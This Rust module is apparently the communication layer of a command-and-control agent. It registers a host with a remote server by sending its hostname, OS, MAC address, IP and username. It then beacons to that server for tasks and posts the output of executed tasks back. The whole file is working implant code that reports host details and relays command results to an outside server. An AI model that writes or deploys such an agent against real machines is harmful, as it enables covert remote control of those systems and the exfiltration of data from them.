use protocol::*;
use crate::state::AgentState;
use uuid::Uuid;

pub async fn register_agent(
    client: &reqwest::Client,
    state: &mut AgentState,
    server_url: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    let mac = crate::system::info::get_mac_address();
    let ip = crate::system::info::get_local_ip();

    let request = RegisterRequest {
        hostname: state.hostname.clone(),
        os: state.os.clone(),
        os_version: state.os_version.clone(),
        mac,
        ip,
        username: state.username.clone(),
    };

    let response = client
        .post(format!("{}/register", server_url))
        .json(&request)
        .send()
        .await?;

    if response.status().is_success() {
        let register_response: RegisterResponse = response.json().await?;
        state.agent_id = Some(register_response.agent_id);
        println!("[+] Registered with server. Agent ID: {}", register_response.agent_id);
        Ok(())
    } else {
        Err(format!("Registration failed: {}", response.status()).into())
    }
}

pub async fn send_beacon(
    client: &reqwest::Client,
    state: &AgentState,
    server_url: &str,
) -> Result<Option<Task>, Box<dyn std::error::Error>> {
    let agent_id = state.agent_id.ok_or("Agent not registered")?;

    let request = BeaconRequest {
        agent_id,
        hostname: state.hostname.clone(),
        os: state.os.clone(),
    };

    let response = client
        .post(format!("{}/beacon", server_url))
        .json(&request)
        .send()
        .await?;

    if response.status().is_success() {
        let beacon_response: BeaconResponse = response.json().await?;
        Ok(beacon_response.task)
    } else {
        Err(format!("Beacon failed: {}", response.status()).into())
    }
}

pub async fn send_task_result(
    client: &reqwest::Client,
    agent_id: Uuid,
    task_id: Uuid,
    output: String,
    exit_code: i32,
    server_url: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    let request = TaskResultRequest {
        agent_id,
        task_id,
        output,
        exit_code,
    };

    let response = client
        .post(format!("{}/task_result", server_url))
        .json(&request)
        .send()
        .await?;

    if response.status().is_success() {
        println!("[+] Task result sent successfully");
        Ok(())
    } else {
        Err(format!("Failed to send task result: {}", response.status()).into())
    }
}
